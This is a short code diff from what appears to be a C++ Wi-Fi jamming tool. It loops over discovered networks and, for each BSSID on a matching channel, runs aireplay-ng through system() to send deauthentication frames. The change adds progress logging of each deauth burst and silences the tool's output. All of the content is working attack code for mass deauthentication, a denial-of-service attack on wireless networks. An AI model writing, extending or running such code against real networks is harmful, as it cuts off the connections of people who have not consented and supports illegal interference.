@@ -102,7 +102,14 @@ int main(int argc, const char* argv[]){
             system( command.c_str() );
             for( int k = 0; k < w_networks.size(); k++ ){
                 if( w_networks[ k ].channel ==  channels[j] ){
-                    string command = "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface;
+                    cout    
+                        << "Sending DeAuth " 
+                        << to_string(i+1) + "/" + to_string(iterations)
+                        << " - BSSID: ["  
+                        << w_networks[ k ].bssid << "] - C: " 
+                        << w_networks[ k ].channel << 
+                    endl;
+                    string command = "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null";
                     system( command.c_str() );
                 }
             }
